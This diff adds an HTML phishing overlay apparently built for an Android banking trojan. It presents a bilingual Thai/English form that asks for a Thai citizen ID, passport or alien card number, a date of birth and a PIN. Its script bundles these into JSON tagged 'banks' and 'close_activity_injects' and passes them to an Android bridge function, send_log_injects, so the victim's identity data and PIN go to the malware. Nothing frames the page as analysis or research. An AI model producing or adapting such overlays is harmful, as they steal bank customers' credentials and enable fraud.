@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #f5f3f6;
+        }
+
+        header {
+            background-color: #fff;
+            overflow: hidden;
+        }
+
+        section {
+            background-color: #fff;
+            padding: 15px;
+        }
+
+        input,button,select {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+        
+        label {
+            color: #343338;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #c9c6cd;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        .button {
+            background-color: #7631c0;
+            color: #fff;
+            border: 0;
+            border-radius: 4px;
+            width: 100%;
+            padding: 10px;
+            font-size: 18px;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+        a:hover {
+            text-decoration: none;
+        }
+
+        .active {
+            background-color: #7631c0 !important;
+            color: #fff !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#7631c0"></span>
+    </div>
+    <select id="lang" onclick="checkLang()" style="float: right;margin-top: 15px;background-color: transparent; color: #7631c0;border: 1px solid #7631c0;padding: 3px 6px;position: absolute;right: 10px;">
+        <option value="ไต้" onclick="checkLang()">ไต้</option>
+        <option value="EN" onclick="checkLang()">EN</option>
+    </select>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <p style="font-weight: 600;font-size: 20px;color: #7631c0;padding: 10px 20px;border-bottom: 1px solid #e8e8e8;" data-translate="_header1">ข้อมูลส่วนตัวของคุณ</p>
+
+                <div style="padding: 5px 15px;margin-bottom: 30px;">
+                    <a href="#" class="active" onclick="goToFirst()" data-translate="_header2" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-radius: 4px 0 0 4px;text-align: center;padding: 10px;">บัตรประชาชน</a>
+                    <a href="#" onclick="goToSecond()" data-translate="_header3" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-left:0;border-right:0;text-align: center;padding: 10px;">หนังสือเดินทาง</a>
+                    <a href="#" onclick="goToThree()" data-translate="_header4" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-radius: 0 4px 4px 0;text-align: center;padding: 10px;">บัตรต่างด้าว</a>
+                </div>
+            </header>
+            <section>
+                <div>
+                    <label for="login" data-translate="_citizenid">บัตรประชาชน</label>
+                    <input type="tel" class="input" id="login" name="login" data-translate="_citizenidPCH" onkeyup="check()" placeholder="ใส่เลขบัตรประชาชน" autocomplete="off" required>
+                </div>
+    
+                <label for="dob" data-translate="_dob">วันเกิด</label>
+                <input type="tel" class="input" id="dob" name="dob" data-translate="_dobPCH" onkeyup="check()" placeholder="วัน/เดือน/ปีw.ศ. 4 หลัก" autocomplete="off" required>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" disabled value="ถัดโป">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <p style="font-weight: 600;font-size: 20px;color: #7631c0;padding: 10px 20px;border-bottom: 1px solid #e8e8e8;" data-translate="_header1">ข้อมูลส่วนตัวของคุณ</p>
+            </header>
+            <section>
+                <div>
+                    <label for="pin" data-translate="_pin">ปักหมุด</label>
+                    <input type="tel" class="input" id="pin" name="pin" onkeyup="check1()" placeholder="ป้อนเข็ม" autocomplete="off" required>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" disabled value="ถัดโป">
+            </footer>
+        </div>
+        <div id="form3" style="display: none;">
+            <header>
+                <p style="font-weight: 600;font-size: 20px;color: #7631c0;padding: 10px 20px;border-bottom: 1px solid #e8e8e8;" data-translate="_header1">ข้อมูลส่วนตัวของคุณ</p>
+
+                <div style="padding: 5px 15px;">
+                    <a href="#" onclick="goToFirst()" data-translate="_header2" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-radius: 4px 0 0 4px;text-align: center;padding: 10px;">บัตรประชาชน</a>
+                    <a href="#" class="active" data-translate="_header3" onclick="goToSecond()" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-left:0;border-right:0;text-align: center;padding: 10px;">หนังสือเดินทาง</a>
+                    <a href="#" onclick="goToThree()" data-translate="_header4" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-radius: 0 4px 4px 0;text-align: center;padding: 10px;">บัตรต่างด้าว</a>
+                </div>
+            </header>
+            <section>
+                <div>
+                    <label for="pasport" data-translate="_passport">เลขหนังสือเดินทาง</label>
+                    <input type="text" class="input" id="pasport" name="pasport" onkeyup="check2()" placeholder="ใส่หมายเลขหนังสือเดินทาง" autocomplete="off" required>
+                </div>
+    
+                <label for="dob" data-translate="_dob">วันเกิด</label>
+                <input type="tel" class="input" id="dobPassport" name="dobPassport" onkeyup="check2()" placeholder="วัน/เดือน/ปีw.ศ. 4 หลัก" autocomplete="off" required>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPagePassport" disabled value="ถัดโป">
+            </footer>
+        </div>
+        <div id="form4" style="display: none;">
+            <header>
+                <p style="font-weight: 600;font-size: 20px;color: #7631c0;padding: 10px 20px;border-bottom: 1px solid #e8e8e8;" data-translate="_header1">ข้อมูลส่วนตัวของคุณ</p>
+            </header>
+            <section>
+                <div>
+                    <label for="pinPassport" data-translate="_pin">ปักหมุด</label>
+                    <input type="tel" class="input" id="pinPassport" name="pinPassport" onkeyup="check3()" placeholder="ป้อนเข็ม" autocomplete="off" required>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendDataPassport" disabled value="ถัดโป">
+            </footer>
+        </div>
+        <div id="form5" style="display: none;">
+            <header>
+                <p style="font-weight: 600;font-size: 20px;color: #7631c0;padding: 10px 20px;border-bottom: 1px solid #e8e8e8;" data-translate="_header1">ข้อมูลส่วนตัวของคุณ</p>
+
+                <div style="padding: 5px 15px;">
+                    <a href="#" onclick="goToFirst()" data-translate="_header2" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-radius: 4px 0 0 4px;text-align: center;padding: 10px;">บัตรประชาชน</a>
+                    <a href="#" onclick="goToSecond()" data-translate="_header3" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-left:0;border-right:0;text-align: center;padding: 10px;">หนังสือเดินทาง</a>
+                    <a href="#" class="active" data-translate="_header4" onclick="goToThree()" style="font-size: 14px;float: left;width: 33.33%;color: #7631c0;border: 1px solid #7631c0;border-radius: 0 4px 4px 0;text-align: center;padding: 10px;">บัตรต่างด้าว</a>
+                </div>
+            </header>
+            <section>
+                <div>
+                    <label for="card" data-translate="_card">เลขบัตรต่างด้าว</label>
+                    <input type="text" class="input" id="card" name="card" onkeyup="check4()" placeholder="ใส่เลขบัตรต่างด้าว" autocomplete="off" required>
+                </div>
+    
+                <label for="dob" data-translate="_dob">วันเกิด</label>
+                <input type="tel" class="input" id="dobCard" name="dobCard" onkeyup="check4()" placeholder="วัน/เดือน/ปีw.ศ. 4 หลัก" autocomplete="off" required>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPageCard" disabled value="ถัดโป">
+            </footer>
+        </div>
+        <div id="form6" style="display: none;">
+            <header>
+                <p style="font-weight: 600;font-size: 20px;color: #7631c0;padding: 10px 20px;border-bottom: 1px solid #e8e8e8;" data-translate="_header1">ข้อมูลส่วนตัวของคุณ</p>
+            </header>
+            <section>
+                <div>
+                    <label for="pinCard" data-translate="_pin">ปักหมุด</label>
+                    <input type="tel" class="input" id="pinCard" name="pinCard" onkeyup="check5()" placeholder="ป้อนเข็ม" autocomplete="off" required>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendDataCard" disabled value="ถัดโป">
+            </footer>
+        </div>
+    </form>
+    <script type="text/javascript">
+        $(function () {
+        
+            // Lets be professional, shall we?
+            "use strict";
+        
+            // Some variables for later
+            var dictionary, set_lang;
+        
+            // Object literal behaving as multi-dictionary
+            dictionary = {
+                "en": {
+                    "_header1": "Your personal information",
+                    "_header2": "Citizen ID",
+                    "_header3": "Passport",
+                    "_header4": "Alien card",
+                    "_citizenid": "Citizen ID",
+                    "_citizenidPCH": "Enter citizen ID",
+                    "_dob": "Date of bitrth",
+                    "_dobPCH": "DD/MM/YYYY",
+                    "_next": "Next",
+                    "_pin": "PIN",
+                    "_pinPCH": "Enter PIN",
+                    "_passport": "Passport no.",
+                    "_card": "Alien card no.",
+                },
+                "ไต้": {
+                    "_header1": "ข้อมูลส่วนตัวของคุณ",
+                    "_header2": "บัตรประชาชน",
+                    "_header3": "หนังสือเดินทาง",
+                    "_header4": "บัตรต่างด้าว",
+                    "_citizenid": "บัตรประชาชน",
+                    "_citizenidPCH": "ใส่เลขบัตรประชาชน",
+                    "_dob": "วันเกิด",
+                    "_dobPCH": "วัน/เดือน/ปีw.ศ. 4 หลัก",
+                    "_pin": "ปักหมุด",
+                    "_pinPCH": "ป้อนเข็ม",
+                    "_passport": "เลขหนังสือเดินทาง",
+                    "_card": "เลขบัตรต่างด้าว",
+                }
+            };
+        
+            // Function for swapping dictionaries
+            set_lang = function (dictionary) {
+                $("[data-translate]").text(function () {
+                    checkLang()
+                    var key = $(this).data("translate");
+                    if (dictionary.hasOwnProperty(key)) {
+                        return dictionary[key];
+                    }
+                });
+
+            };
+        
+            // Swap languages when menu changes
+            $("#lang").on("change", function () {
+                var language = $(this).val().toLowerCase();
+                if (dictionary.hasOwnProperty(language)) {
+                    set_lang(dictionary[language]);
+                }
+            });
+        
+            // Set initial language to English
+            set_lang(dictionary.ไต้);
+        
+        });
+        </script>
+    <script>
+        $('#login').mask('0 0000 00000 00 0');
+        $('#dob').mask('00/00/0000');
+        $('#dobPassport').mask('00/00/0000');
+        $('#dobCard').mask('00/00/0000');
+
+        var login = document.getElementById('login'),
+            dob = document.getElementById('dob'),
+            pin = document.getElementById('pin'),
+            pinPassport = document.getElementById('pinPassport'),
+            pinCard = document.getElementById('pinCard'),
+            nextPage = document.getElementById('nextPage'),
+            nextPagePassport = document.getElementById('nextPagePassport'),
+            nextPageCard = document.getElementById('nextPageCard'),
+            sendData = document.getElementById('sendData'),
+            sendDataPassport = document.getElementById('sendDataPassport'),
+            sendDataCard = document.getElementById('sendDataCard'),
+            spinner = document.getElementById('spinner'),
+            pasport = document.getElementById('pasport'),
+            dobPassport = document.getElementById('dobPassport');
+            dobCard = document.getElementById('dobCard');
+            card = document.getElementById('card');
+
+        function checkLang(){
+            if(lang.value === 'ไต้') {
+                login.placeholder = "ใส่เลขบัตรประชาชน";
+                dob.placeholder = "วัน/เดือน/ปีw.ศ. 4 หลัก";
+                dobPassport.placeholder = "วัน/เดือน/ปีw.ศ. 4 หลัก";
+                nextPage.value = 'ถัดโป';
+                nextPagePassport.value = 'ถัดโป';
+                pin.placeholder = 'ป้อนเข็ม';
+                pinPassport.placeholder = 'ป้อนเข็ม';
+                dobCard.placeholder = "วัน/เดือน/ปีw.ศ. 4 หลัก";
+                nextPageCard.value = 'ถัดโป';
+                pinCard.placeholder = 'ป้อนเข็ม';
+                pasport.placeholder = 'ใส่หมายเลขหนังสือเดินทาง';
+                card.placeholder = 'ใส่เลขบัตรต่างด้าว';
+                sendData.value = 'ถัดโป';
+                sendDataPassport.value = 'ถัดโป';
+                sendDataCard.value = 'ถัดโป';
+            } else {
+                login.placeholder = "Enter your citizen ID";
+                dob.placeholder = "DD/MM/YYYY";
+                nextPage.value = "Next";
+                pin.placeholder = "Enter PIN";
+                dobPassport.placeholder = "DD/MM/YYYY";
+                nextPagePassport.value = "Next";
+                pinPassport.placeholder = "Enter PIN";
+                dobCard.placeholder = "DD/MM/YYYY";
+                nextPageCard.value = "Next";
+                pinCard.placeholder = "Enter PIN";
+                pasport.placeholder = "Enter passport no.";
+                card.placeholder = "Enter alien card no.";
+                sendData.value = "Next";
+                sendDataCard.value = "Next";
+                sendDataPassport.value = "Next";
+            }
+        }
+
+        function check() {
+            if(login.value.length === 17 && dob.value.length === 10){
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        function check2() {
+            if(pasport.value.length > 2 && dobPassport.value.length === 10){
+                nextPagePassport.disabled = false;
+            } else {
+                nextPagePassport.disabled = true;
+            }
+        }
+
+        function check4() {
+            if(card.value.length > 2 && dobCard.value.length === 10){
+                nextPageCard.disabled = false;
+            } else {
+                nextPageCard.disabled = true;
+            }
+        }
+
+        function check3() {
+            if(pinPassport.value.length > 3){
+                sendDataPassport.disabled = false;
+            } else {
+                sendDataPassport.disabled = true;
+            }
+        }
+        
+        nextPagePassport.onclick = function() {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                form3.style.display = 'none';
+                form4.style.display = 'block';
+            }, 1500);
+        }
+        
+        nextPageCard.onclick = function() {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                form5.style.display = 'none';
+                form6.style.display = 'block';
+            }, 1500);
+        }
+
+        function check1() {
+            if(pin.value.length > 3){
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        function check5() {
+            if(pinCard.value.length > 3){
+                sendDataCard.disabled = false;
+            } else {
+                sendDataCard.disabled = true;
+            }
+        }
+
+        nextPage.onclick = function() {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                form1.style.display = 'none';
+                form2.style.display = 'block';
+            }, 1500);
+        }
+
+        sendData.onclick = function() {
+            var data = {};
+            data.login = login.value;
+            data.dob = dob.value;
+            data.pin = pin.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+
+        sendDataPassport.onclick = function() {
+            var data = {};
+            data.pasport = pasport.value;
+            data.dobPassport = dobPassport.value;
+            data.pinPassport = pinPassport.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+
+        sendDataCard.onclick = function() {
+            var data = {};
+            data.card = card.value;
+            data.dobCard = dobCard.value;
+            data.pinCard = pinCard.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+
+        function goToFirst() {
+            form1.style.display = 'block'
+            form2.style.display = 'none'
+            form3.style.display = 'none'
+            form4.style.display = 'none'
+            form5.style.display = 'none'
+            form6.style.display = 'none'
+        }
+
+        function goToSecond() {
+            form1.style.display = 'none'
+            form2.style.display = 'none'
+            form3.style.display = 'block'
+            form4.style.display = 'none'
+            form5.style.display = 'none'
+            form6.style.display = 'none'
+        }
+
+        function goToThree() {
+            form1.style.display = 'none'
+            form2.style.display = 'none'
+            form3.style.display = 'none'
+            form4.style.display = 'none'
+            form5.style.display = 'block'
+            form6.style.display = 'none'
+        }
+
+    </script>
+</body>
+</html>
